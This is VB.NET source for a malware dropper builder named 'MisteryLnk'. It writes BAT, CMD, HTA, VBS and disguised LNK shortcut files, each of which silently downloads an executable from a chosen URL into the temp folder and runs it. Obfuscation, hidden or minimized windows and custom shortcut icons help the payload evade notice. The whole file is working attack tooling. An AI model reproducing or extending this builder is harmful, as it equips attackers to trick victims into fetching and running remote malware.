Imports System
Imports System.IO
Imports System.Text
Imports System.Windows.Forms
Imports IWshRuntimeLibrary
Imports File = System.IO.File

Namespace MisteryLnk.Algorithms
	Friend Class Builder
		#Region "BatBuilder"
		Public Shared Sub BatBuilder(ByVal url As String, ByVal DropMethod As String, ByVal obfuscate As Boolean)
			Dim fileName As String = RandomFileName("exe")
			Dim template As String = $"" & ControlChars.CrLf & _
"@echo off" & ControlChars.CrLf & _
"cd %temp%" & ControlChars.CrLf & _
"curl -o {fileName} {url}" & ControlChars.CrLf & _
"start {fileName}" & ControlChars.CrLf & _
""
			If obfuscate Then
				template = Obfuscator.BatObfuscator(template)
			End If
			SaveToFile(template, "BAT")
		End Sub
		#End Region

		#Region "CmdBuilder"
		Public Shared Sub CmdBuilder(ByVal url As String, ByVal DropMethod As String, ByVal obfuscate As Boolean)
			Dim fileName As String = RandomFileName("exe")
			Dim template As String = $"" & ControlChars.CrLf & _
"@echo off" & ControlChars.CrLf & _
"cd %temp%" & ControlChars.CrLf & _
"curl -o {fileName} {url}" & ControlChars.CrLf & _
"start {fileName}" & ControlChars.CrLf & _
""
			If obfuscate Then
				template = Obfuscator.BatObfuscator(template)
			End If
			SaveToFile(template, "CMD")
		End Sub
		#End Region

		#Region "HtaBuilder"
		Public Shared Sub HtaBuilder(ByVal url As String, ByVal DropMethod As String)
			Dim exeName As String = RandomFileName("exe")
			Dim cmdCommand As String = $"/c curl {url} -o %temp%\{exeName} & start /b %temp%\{exeName}"
			Dim template As String = $"" & ControlChars.CrLf & _
"<!DOCTYPE html>" & ControlChars.CrLf & _
"<html>" & ControlChars.CrLf & _
"<head>" & ControlChars.CrLf & _
"<script>" & ControlChars.CrLf & _
"var objShell = new ActiveXObject(""WScript.Shell"");" & ControlChars.CrLf & _
"var command = ""cmd.exe {cmdCommand}"";" & ControlChars.CrLf & _
"objShell.Run(command, 0, true);" & ControlChars.CrLf & _
"window.close();" & ControlChars.CrLf & _
"</script>" & ControlChars.CrLf & _
"</head>" & ControlChars.CrLf & _
"<body>" & ControlChars.CrLf & _
"</body>" & ControlChars.CrLf & _
"</html>" & ControlChars.CrLf & _
""
'            if (obfuscate)
'            {
'                template = Obfuscator.HTAObfuscator(template);
'            }
			SaveToFile(template, "HTA")
		End Sub
		#End Region

		#Region "VbsBuilder"
		Public Shared Sub VbsBuilder(ByVal url As String, ByVal DropMethod As String, ByVal obfuscate As Boolean)
			Dim exeName As String = RandomFileName("exe")
			Dim cmdCommand As String = $"/c curl {url} -o %temp%\{exeName} & start /b %temp%\{exeName}"
			Dim vbscript As String = $"" & ControlChars.CrLf & _
"Set objShell = CreateObject(""WScript.Shell"")" & ControlChars.CrLf & _
"command = ""cmd.exe {cmdCommand}""" & ControlChars.CrLf & _
"objShell.Run command, 0, True" & ControlChars.CrLf & _
""
			If obfuscate Then
				vbscript = Obfuscator.VBSObfuscator(vbscript)
			End If
			SaveToFile(vbscript, "VBS")
		End Sub
		#End Region

		#Region "LnkBuilder"
		Public Shared Sub LnkBuilder(ByVal url As String, ByVal DropMethod As String, ByVal IconFile As String)
			' Generate a random file name for the downloaded executable
			Dim exeName As String = RandomFileName("exe")
			' Prompt the user to select a location to save the .lnk file
			Dim saveFileDialog As SaveFileDialog = New SaveFileDialog With {.Filter = "Shortcut (*.lnk)|*.lnk", .Title = "Save Shortcut"}

			If saveFileDialog.ShowDialog() = DialogResult.OK Then
				Dim shortcutPath As String = saveFileDialog.FileName

				Try
					Dim shell As New WshShell()
					Dim shortcut As IWshShortcut = DirectCast(shell.CreateShortcut(shortcutPath), IWshShortcut)
					shortcut.TargetPath = "cmd.exe"
					shortcut.Arguments = $"/c mode 15,1 & curl {url} -o %temp%\{exeName} & start /b %temp%\{exeName}"

					shortcut.WindowStyle = 7 ' Minimized window
					If IconFile IsNot Nothing Then
						shortcut.IconLocation = IconFile
					End If

					shortcut.Save()
				Catch ex As Exception
					MessageBox.Show($"An error occurred while creating the shortcut: {ex.Message}", "Error", MessageBoxButtons.OK, MessageBoxIcon.Error)
				End Try
			Else
				MessageBox.Show("File path is empty!", "Build information", MessageBoxButtons.OK, MessageBoxIcon.Error)
			End If
		End Sub
		#End Region

		#Region "Helper Functions"
		Private Shared Sub SaveToFile(ByVal content As String, ByVal extension As String)
			Using saveFileDialog As New SaveFileDialog()
				saveFileDialog.Filter = $"{extension} files (*.{extension.ToLower()})|*.{extension.ToLower()}|All files (*.*)|*.*"
				If saveFileDialog.ShowDialog() = DialogResult.OK Then
					File.WriteAllText(saveFileDialog.FileName, content)
				End If
			End Using
		End Sub

		Private Shared Function RandomFileName(ByVal extension As String) As String
			Dim fileName As String = Path.GetRandomFileName()
			Return Path.ChangeExtension(fileName, extension)
		End Function
		#End Region
	End Class
End Namespace
